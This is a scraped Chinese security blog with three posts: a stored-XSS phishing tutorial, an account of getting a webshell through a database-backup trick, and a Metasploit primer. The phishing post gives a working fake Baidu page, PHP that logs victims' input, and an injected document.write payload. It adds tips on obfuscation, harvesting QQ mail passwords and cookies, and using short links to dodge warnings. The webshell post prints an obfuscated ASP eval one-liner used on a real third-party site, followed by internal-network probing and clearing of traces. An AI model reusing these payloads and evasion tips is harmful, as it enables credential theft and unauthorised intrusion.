<span class="tag">&lt;<span class="name">tr</span> <span class="attr">height</span>=<span class="string">"40%"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/baidu001.gif"</span> <span class="attr">width</span>=<span class="string">"270px"</span> <span class="attr">height</span>=<span class="string">"129px"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span>	</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"baidu.php"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"wd"</span> <span class="attr">style</span>=<span class="string">"width: 540px;height: 36px;font-size: 20px;"</span>/&gt;</span></span><br><span class="line"> 	<span class="comment">&lt;!-- &lt;img src="image/camera#.png" /&gt; --&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">style</span>=<span class="string">"border:0;width: 100px;height: 44px;background-color: #317EF3;color: white;font-size: 18px;"</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/loading.gif"</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span>手机百度<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"dd"</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>把百度设为主页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>关于百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>About Baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>百度推广<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"dd"</span>&gt;</span></span><br><span class="line"> 	◎2018 Baidu <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>使用百度前必读<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>意见反馈<span class="tag">&lt;/<span class="name">a</span>&gt;</span>京ICP证030173号<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/jing01.png"</span> /&gt;</span> 京公网安备110000002000001号<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"image/jing01.png"</span>/&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> 	 </span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>接收数据的baidu.php,接收了搜索的关键字wd以添加的方式写入baidu_search.txt并控制js跳转到真正搜索这个关键词的百度页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$wd = urlencode($_REQUEST[&apos;wd&apos;]);</span><br><span class="line">$log = fopen(&quot;baidu_search.txt&quot;, &quot;a&quot;);</span><br><span class="line">fwrite($log, $wd . &quot;\r\n&quot;);</span><br><span class="line">fclose($log);</span><br><span class="line"></span><br><span class="line">#echo $wd;</span><br><span class="line"></span><br><span class="line">echo &apos;&lt;script language=&quot;javascript&quot;&gt;&apos;;</span><br><span class="line">echo &quot;location.href=&apos;https://www.baidu.com/s?wd=&quot;.$wd.&quot;&amp;rsv_spt=1&amp;rsv_iqid=0xcd9013d50001ba80&amp;issp=1&amp;f=8&amp;rsv_bp=0&amp;rsv_idx=2&amp;ie=utf-8&amp;tn=baiduhome_pg&amp;rsv_enter=1&amp;rsv_sug3=5&amp;rsv_sug1=2&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;inputT=805&amp;rsv_sug4=816&apos;&quot;;</span><br><span class="line">echo &apos;&lt;/script&gt;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>百度页面目前的样子：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing11.png" alt=""></p>
<p>ps:其中baidu.html中用到的图片我放到github上面了 <a href="https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC" target="_blank" rel="noopener">https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC</a> </p>
<p>ps2:包括一个完整的qq邮箱前端后端钓鱼代码也写到了这个github目录里面，可以拿去学习，如果用于非法用途造成的后果与本人无关，展示效果如下：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing11-1.png" alt=""></p>
<p>至此环境搭建完成。</p>
<h2 id="0x04-复现-钓鱼过程"><a href="#0x04-复现-钓鱼过程" class="headerlink" title="0x04 复现-钓鱼过程"></a>0x04 复现-钓鱼过程</h2><p>我们要复现这个攻击过程需要将js代码写入这个存储型xss漏洞中，这个代码的功能需要做到将我们服务器的baidu.html通过iframe框架调用过来。</p>
<p>那么我们先写一个调用baidu.html的iframe.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"https://www.baidu.com/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"shortcut icon"</span> <span class="attr">href</span>=<span class="string">"https://www.baidu.com/favicon.ico"</span> <span class="attr">type</span>=<span class="string">"image/x-icon"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">body&#123;</span></span><br><span class="line"><span class="undefined">      margin:0px;</span></span><br><span class="line"><span class="undefined">	  border:0px;</span></span><br><span class="line"><span class="undefined">	  padding:0px;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">iframe&#123;border:0px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1/xss/hk/baidu.html"</span> <span class="attr">id</span>=<span class="string">"iframepage"</span> <span class="attr">name</span>=<span class="string">"iframepage"</span>  <span class="attr">width</span>=<span class="string">"101%"</span> <span class="attr">height</span>=<span class="string">"101%"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这个页面可以将伪造的百度页面整体拉到我们目前页面中。</p>
<p>想将他用到xss漏洞，需要先将iframe.html页面整个url编码一次。</p>
<p>然后将编码好的内容写到这个函数里，再整体写在刚才存在xss漏洞的留言页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.onload=function()&#123;document.write(decodeURI(&quot;%3Chtml%3E%0A%3Chead%3E%0A%3Cmeta%20http-equiv=%22Content-Type%22%20content=%22text/html;%20charset=utf-8%22%20/%3E%20%0A%3Ctitle%3E%E7%99%BE%E5%BA%A6%E4%B8%80%E4%B8%8B%EF%BC%8C%E4%BD%A0%E5%B0%B1%E7%9F%A5%E9%81%93%3C/title%3E%0A%3Clink%20rel=%22icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Clink%20rel=%22shortcut%20icon%22%20href=%22https://www.baidu.com/favicon.ico%22%20type=%22image/x-icon%22%20/%3E%0A%3Cstyle%3Ebody%7B%0A%20%20%20%20%20%20margin:0px;%0A%09%20%20border:0px;%0A%09%20%20padding:0px;%0A%20%20%7D%0Aiframe%7Bborder:0px;%0A%7D%0A%3C/style%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%3Ciframe%20src=%22http://127.0.0.1/xss/hk/baidu.html%22%20id=%22iframepage%22%20name=%22iframepage%22%20%20width=%22101%25%22%20height=%22101%25%22%20%3E%3C/iframe%3E%0A%3C/body%3E%0A%3C/html%3E&quot;))&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing12.png" alt=""></p>
<p>下来我们将这个留言界面的网址，通过新浪短链接等工具生成一个短链接发送给别人，这里就发给我自己进行测试吧。</p>
<p>打开链接发现留言系统的页面已经变成了自己搭建好的伪造百度页面，但是网址还是存在xss漏洞的网址。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing13.png" alt=""></p>
<p>这个时候我们搜索：黑暗剑21</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing14.png" alt=""></p>
<p>然后就会发现跳转到了真正的百度搜索中，返回的词条也一致。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing15.png" alt=""></p>
<p>最后我们打开刚才存储数据的txt文件，发现多出一条 %E9%BB%91%E6%9A%97%E5%89%9121 </p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing16.png" alt=""></p>
<p>解码之后就是黑暗剑21。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing17.png" alt=""></p>
<p>至此我们一个完整的钓鱼流程就结束了。</p>
<h2 id="0x05-额外技巧"><a href="#0x05-额外技巧" class="headerlink" title="0x05 额外技巧"></a>0x05 额外技巧</h2><ul>
<li><p>如果我们不想让别人轻易从存在xss存储漏洞页面通过源代码轻易看出我们的目的，我们就需要通过代码混淆和加密的方式将代码伪造一番。</p>
</li>
<li><p>如果我们将伪造的页面换成qq邮箱，qq空间等用来钓鱼账号密码，那么就得将接收数据的php页面写成接收好数据保存，然后通过代理的方式向真正的页面提交请求，得到返回的cookie再跳转登陆。</p>
</li>
<li><p>要发给别人的钓鱼链接最好通过腾讯、新浪等公司提供的短链接生成器，这样不会在聊天窗口变成红色感叹号，甚至会变成绿色安全符号。</p>
</li>
</ul>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>网络钓鱼是最常见的盗号手段，对大部分具备网络安全意识的人很难起作用，但是如果这个网站制作的极其逼真，又是在一些知名公司挖到的存储型xss漏洞上布置的，很多人看到是正规的大公司域名，是不是就非常容易钓鱼成功呢？</p>
<p>所以面对不明链接的时候，要提升自己的安全意识，能不点则不点，更不要轻易输入账号密码和个人信息。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/19/数据库备份getshell/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/19/数据库备份getshell/" itemprop="url">
                  数据库备份getshell
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-19T11:16:25+08:00">
                2018-05-19
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
                    <span itemprop="name">渗透测试</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/19/数据库备份getshell/" class="leancloud_visitors" data-flag-title="数据库备份getshell">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>很久之前通过数据库备份拿到的一个webshell，本来准备等他们修复了之后再写的，但是提交了漏洞和修复方案他们接收之后很长时间没有修复，忽视了漏洞。所以今天写出来了。</p>
<h2 id="0x01-多次尝试"><a href="#0x01-多次尝试" class="headerlink" title="0x01 多次尝试"></a>0x01 多次尝试</h2><p>首先这个站是偶然google hacking时找到的后台弱密码，进入后台之后发现是IIS6.0的服务器：</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback01.png" alt=""></p>
<p>这个后台可以对前端的文章、新闻等进行修改，发现可以上传图片到文章中，是一个上传点。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback02.png" alt=""></p>
<p>先编辑一个一句话木马,存为asp格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;4&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;</span><br></pre></td></tr></table></figure></p>
<p>直接上传.asp文件，被防火墙阻止。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback03.png" alt=""></p>
<p>先上传.jpg文件，然后通过burpsuite更改后缀为.asp，然后上传，发现仍然被拦截，看来是后端拦截。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback04.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback05.png" alt=""></p>
<p>尝试使用IIS6.0的解析漏洞，将.asp;.jpg文件解析成.asp文件，但是更改了一个1.asp;.jpg后缀的文件上传之后，文件名整体被改成一个日期的+随机数+.jpg的文件名。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback06.png" alt=""></p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback07.png" alt=""></p>
<p>尝试用burpsuite改数据，0x00截断方式、超长文件名仍然不可行。</p>
<h2 id="0x02-改变思路"><a href="#0x02-改变思路" class="headerlink" title="0x02 改变思路"></a>0x02 改变思路</h2><p>本来测试到这里我已经放弃通过上传点来getshell，但是不甘心就去问了下朋友，朋友说他正好在复现这个kindeditor编辑器的漏洞，为我提供了其他思路，我去网上找了一会kindeditor编辑器漏洞版本，尝试了一会，发现目前这个版本是4.1.10不存在之前那些典型的漏洞。</p>
<p>然后这个时候朋友告诉我有数据库备份，可以通过数据库备份功能来利用解析漏洞。</p>
<h2 id="0x03-开始尝试"><a href="#0x03-开始尝试" class="headerlink" title="0x03 开始尝试"></a>0x03 开始尝试</h2><p>先编辑一个过狗asp马，更改为jpg格式上传。</p>
<p>然后在数据库备份界面，发现直接无法更改备份的源路径和目的路径</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback08.png" alt=""></p>
<p>但是这两个路径是前端可控的，那就很容易了，直接f12更改页面中对应的原路径为自己上传的图片马，目的路径为123.asp即可。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback09.png" alt=""></p>
<p>然后备份数据库，在upload路径找到自己的马，直接用菜刀连接，成功getshell。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/databaseback/dbback10.png" alt=""></p>
<p>后来传大马稍微对内网测试了一下，然后完成之后清理痕迹。</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>虽然是很老的一个漏洞了，没有太多亮点，但是体现了渗透测试过程中要力求多样性，了解的方式和技巧越多，就距离成功越接近。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/17/渗透测试框架metasploit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/17/渗透测试框架metasploit/" itemprop="url">
                  渗透测试框架metasploit
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-17T20:26:23+08:00">
                2018-05-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/17/渗透测试框架metasploit/" class="leancloud_visitors" data-flag-title="渗透测试框架metasploit">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>Metasploit是一款开源安全漏洞检测工具，可以用于渗透测试不同的系统和框架，附带数百个已知的软件漏洞，并保持频繁更新。</p>
<p>Metasploit框架是用Ruby语言开发的，包括Perl写的脚本，C ，汇编，和Python各种组件，并且可以由用户自行编写代码加入Metasploit的数据库。</p>
<h2 id="0x01-术语"><a href="#0x01-术语" class="headerlink" title="0x01 术语"></a>0x01 术语</h2><p>在讲解Metasploit之前，先对我们即将用到的术语做一个解释。</p>
<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><p>Exploit操纵计算机系统中特定漏洞的恶意代码. Metasploi提供了跨多个操作系统和应用程序的Exploit，提供了突破一台电脑的多种途径。可以用Nessus搭配Nmap进行漏洞扫描,并使用Metasploit进行漏洞利用。在确定一个特定的漏洞却无法在Metasploit数据库中找到利用的Exploit，可以通过访问exploit-db.com查找下载该漏洞利用程序，编译知道可以将其移植到Metasploit的数据库做为一个Exploit。</p>
<h4 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h4><p>利用漏洞之前要先建立一个Payload,其作用是确定漏洞攻击成功之后要执行什么操作，Payload基本上是用于访问远程计算机的反向shell和通过shell植入后门等到被入侵的电脑。</p>
<h4 id="Encoders"><a href="#Encoders" class="headerlink" title="Encoders"></a>Encoders</h4><p>不能确保所有Metasploit中的exp都可以正常工作，有时候会遇到防火墙、IPS、IDC等，所有的试图攻击等可能会被防火墙过滤掉，这时候就需要使用Encoders来对exp进行编码等，用来逃避防火墙、IPS、IDS的检测。</p>
<h4 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h4><p>所有的Exploit和Payload都有一些内置的参数，诸如远程IP、本地IP、LPORT、RPORT、服务路径、用户名等。这些参数在利用exp之前需要进行配置，可以使用Show Options命令来显示具体的选项。</p>
<h2 id="0x02-模式"><a href="#0x02-模式" class="headerlink" title="0x02 模式"></a>0x02 模式</h2><p>Metasploit有三种模式供用户使用，分别是控制台、命令行、web，我分别简述一下三种模块的优点。</p>
<p>Msfconsole（控制台）的优点是最实用、最强大的集各种功能于一体的漏洞利用框架，在控制台界面时功能最全面。</p>
<p>Msfcli（命令行）的优点是侧重对脚本执行、以及可解释性，并且自动化方面很强。</p>
<p>Msfweb（web界面）是一个Gui形界面，主要优点是为了让渗透测试操作变得更加容易，从命令行启动之后会创建一个web server,ip地址是127.0.0.1,端口是55553。</p>
<p>我使用Msfconsole来演示。</p>
<h2 id="0x03-模块"><a href="#0x03-模块" class="headerlink" title="0x03 模块"></a>0x03 模块</h2><p>我们在安装目录输入./Msfupdate更新一下metasploit</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit01.png" alt=""></p>
<p>然后使用service postgresql start打开漏洞数据库服务</p>
<p>然后使用./Msfconsole命令进入控制台交互界面，然后开始模块的使用。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit02.png" alt=""></p>
<h4 id="show模块"><a href="#show模块" class="headerlink" title="show模块"></a>show模块</h4><p>show模块可以用来显示可用的exploits、payloads、encoders等等</p>
<p>我们可以直接加参数来只显示某一类</p>
<p>如show exploits</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit03.png" alt=""></p>
<p>显示出来的有exp的名字、时间、攻击模块等级和描述。</p>
<p>等级是我们选取时优先关注的，一般选择excellent和great两种等级，因为稳定且效果明显，其次查看后面的描述是否和我们攻击的服务有关，如果找到合适的模块，我们就可以记住名字之后使用。</p>
<h4 id="search模块"><a href="#search模块" class="headerlink" title="search模块"></a>search模块</h4><p>我们之前使用show的时候出现了非常多的条目，但在应对实际情况中，肯定不能自己肉眼去寻找需要的exp，而search模块可以帮助我们快速筛选需要的exp。</p>
<p>我们可以查看search -h的内容帮助我们学会这个模块的用法。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit04.png" alt=""></p>
<p>如search cve:2017 type:exploit</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit05.png" alt=""></p>
<p>然后我们再根据攻击模块等级和描述进一步人工筛选，就快了很多。</p>
<h4 id="info模块"><a href="#info模块" class="headerlink" title="info模块"></a>info模块</h4><p>上面列举出来的模块我们只能看到大概信息，如果我们想要查看详细信息和利用方式等等，就得使用info模块来查看</p>
<p>使用方法是info+模块名</p>
<p>如struct-s2-052漏洞即cve:2017-9805：</p>
<p>info exploit/multi/http/struts2_rest_xstream</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit06.png" alt=""></p>
<h4 id="use模块"><a href="#use模块" class="headerlink" title="use模块"></a>use模块</h4><p>前面我们筛选出来合适的exp，下来就需要用use模块来使用这个exp</p>
<p>使用方式是use+模块名</p>
<p>如struct-s2-052漏洞</p>
<p>use exploit/multi/http/struts2_rest_xstream</p>
<h4 id="set模块"><a href="#set模块" class="headerlink" title="set模块"></a>set模块</h4><p>选好了模块下来就该攻击了，那攻击谁？怎么攻击？需要用这次攻击做什么事情？这些事情我们还没有告诉metasploit，所以我们需要用set来完成这些设置。</p>
<p>首先我们需要一个payload完成我们要做的事情，我们通过前面的show命令，查看一下payload</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit07.png" alt=""></p>
<p>然后再选择一个payload，用set payload PayloadName 来设置好这次攻击用到的payload</p>
<p>这里我们用一个较稳定的反弹shell</p>
<p>set payload windows/exec</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit08.png" alt=""></p>
<p>接着设置攻击参数，具体有哪些攻击参数需要设置，我们可以用show options命令查看。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit09.png" alt=""></p>
<p>然后我们根据看到的情况，结合我们要攻击的目标设置攻击参数，我这里在物理机重新搭了一遍struct-2-052漏洞的环境，可以参考之前的一篇博客进行配置： <a href="http://uuzdaisuki.com/2018/01/22/struts2-052%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://uuzdaisuki.com/2018/01/22/struts2-052%E6%BC%8F%E6%B4%9E/</a></p>
<p>额外将tomcat/conf/server.xml中的这两处地方改为本机在局域网中的ip，就可以通过另一台机器访问了。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/metaspolit/metaspoit10.png" alt=""></p>
